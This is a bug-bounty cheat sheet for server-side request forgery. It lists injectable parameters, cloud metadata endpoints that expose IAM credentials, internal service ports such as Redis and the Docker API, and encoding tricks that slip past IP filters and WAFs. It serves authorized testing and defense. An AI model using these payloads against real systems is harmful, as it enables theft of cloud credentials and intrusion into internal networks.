# SSRF — Server-Side Request Forgery

## Injection Points
```
?url=, ?src=, ?redirect=, ?next=, ?image=, ?webhook=, ?callback=
JSON: {"webhook": "http://...", "avatar_url": "http://..."}
SVG: <image href="http://internal">
```

## SSRF Payloads (Escalating Impact)

### DNS-only (Informational — Insufficient Alone)
```
https://attacker.burpcollaborator.net
```

### Cloud Metadata (Critical on Cloud Apps)
```
# AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
http://169.254.169.254/latest/user-data/

# GCP (requires Metadata-Flavor: Google header)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure IMDS (requires Metadata: true header)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### Internal Port Scan
```
http://localhost:6379     # Redis (unauth, RESP protocol)
http://localhost:9200     # Elasticsearch (/_cat/indices)
http://localhost:2375     # Docker API — GET /containers/json → RCE
http://localhost:8080     # Admin panel
http://10.x.x.x:80        # Internal services (often no auth)
```

## SSRF IP Bypass Techniques (11 Techniques)

| Technique | Example | Notes |
|---|---|---|
| Decimal IP | `http://2130706433` | 127.0.0.1 as decimal |
| Octal IP | `http://0177.0.0.1` | Octal 0177 = 127 |
| Hex IP | `http://0x7f.0x0.0x0.0x1` | Hex representation |
| Short IP | `http://127.1` | Abbreviated notation |
| IPv6 Loopback | `http://[::1]` | Loopback in IPv6 |
| IPv4-mapped IPv6 | `http://[::ffff:127.0.0.1]` | IPv4-mapped IPv6 |
| Mixed Hex IPv6 | `http://[::ffff:0x7f000001]` | Mixed hex IPv6 |
| DNS Rebinding | Attacker DNS → internal IP | First check = external, fetch = internal |
| Redirect Chain | External URL → 302 to internal | Vercel pattern — check each hop |
| URL Parser Confusion | `http://attacker.com#@internal` | Parser inconsistency |
| CNAME to Internal | Attacker domain → internal hostname | DNS points inward |

## SSRF Impact Chain
| Level | Finding | Severity |
|-------|---------|----------|
| 1 | DNS-only callback | Informational (kill) |
| 2 | Internal service accessible (HTTP response) | Medium |
| 3 | Cloud metadata reachable | High |
| 4 | Cloud metadata + exfil keys (IAM creds) | Critical |
| 5 | Cloud creds used → S3 read / cross-account / SSM secrets | Critical ($15K–$50K) |

## IMDSv2 (AWS) Bypass
```bash
# IMDSv2 requires PUT for token first
# If SSRF only allows GET, try GCP/Azure instead:
# GCP: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
#      Header: Metadata-Flavor: Google
# Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
#        Header: Metadata: true
```

## WAF Bypass for SSRF
If WAF blocks `127.0.0.1`/`169.254.169.254`, try:
- `2130706433` (decimal)
- `0x7f000001` (hex)
- `[::1]` (IPv6)
- `[::ffff:127.0.0.1]` (IPv4-mapped)
- `127.0.0.1.nip.io` (DNS rebind)
- `127。0。0。1` (full-width period U+3002)

Run: `bughunter/tools/waf_encoder.py "<payload>" --class generic`